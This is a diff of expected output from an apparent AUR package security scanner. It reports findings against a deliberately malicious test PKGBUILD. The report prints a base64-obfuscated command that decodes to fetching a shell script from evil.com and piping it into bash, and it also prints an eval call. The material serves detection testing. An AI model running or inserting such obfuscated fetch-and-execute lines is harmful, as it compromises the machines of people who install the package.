@@ -9,21 +9,21 @@ Scan Results: malicious-obfuscated
 
 [HIGH] OBF-001 Base64 decoding
     Base64 decoding may hide malicious payloads
-    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/obfuscated/PKGBUILD:14
+    Location: tests/fixtures/malicious/obfuscated/PKGBUILD:14
     Code:     echo "Y3VybCBodHRwczovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaA==" | base64 -d | sh
     Recommendation: Decode and review the base64 content manually
     Reference: CWE-506
 
 [HIGH] OBF-001 Base64 decoding
     Base64 decoding may hide malicious payloads
-    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/obfuscated/PKGBUILD:14
+    Location: tests/fixtures/malicious/obfuscated/PKGBUILD:14
     Code:     echo "Y3VybCBodHRwczovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaA==" | base64 -d | sh
     Recommendation: Decode and review the base64 content manually
     Reference: CWE-506
 
 [HIGH] OBF-002 Eval usage
     Eval can execute obfuscated malicious code
-    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/obfuscated/PKGBUILD:17
+    Location: tests/fixtures/malicious/obfuscated/PKGBUILD:17
     Code:     eval "$MALICIOUS_CODE"
     Recommendation: Avoid eval; use direct commands instead
     Reference: CWE-95
@@ -36,7 +36,7 @@ Scan Results: malicious-obfuscated
 
 ============================================================
 Package: malicious-obfuscated v1.0.0-1
-Scan duration: 1ms
+Scan duration: 4ms
 
 Found 5 issue(s):
   1 CRITICAL
